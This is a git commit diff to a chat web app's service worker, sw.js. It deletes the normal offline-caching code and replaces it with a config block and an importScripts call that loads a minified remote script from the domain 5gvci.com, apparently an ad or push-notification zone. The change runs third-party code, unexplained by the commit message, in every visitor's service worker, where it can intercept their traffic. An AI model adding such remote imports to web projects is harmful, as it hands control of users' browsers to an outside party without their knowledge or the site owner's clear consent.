3f83f823f680cb6dd0ce1f64ebaaeb3b09eea34d
ChawTrexx <rupalchetia009@gmail.com>
2026-05-21 02:10:17 +0530

    Add files via upload

--- sw.js
+++ sw.js
@@ -1,19 +1,6 @@
-self.addEventListener("install", (e) => {
-  e.waitUntil(
-    caches.open("chat-cache-v1").then((cache) => {
-      return cache.addAll([
-        "./",
-        "./index.html",
-        "./manifest.json",
-        "./chat (2).png",
-        "./chat.png"
-      ]);
-    })
-  );
-});
-
-self.addEventListener("fetch", (e) => {
-  e.respondWith(
-    caches.match(e.request).then((response) => response || fetch(e.request))
-  );
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 11035125
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
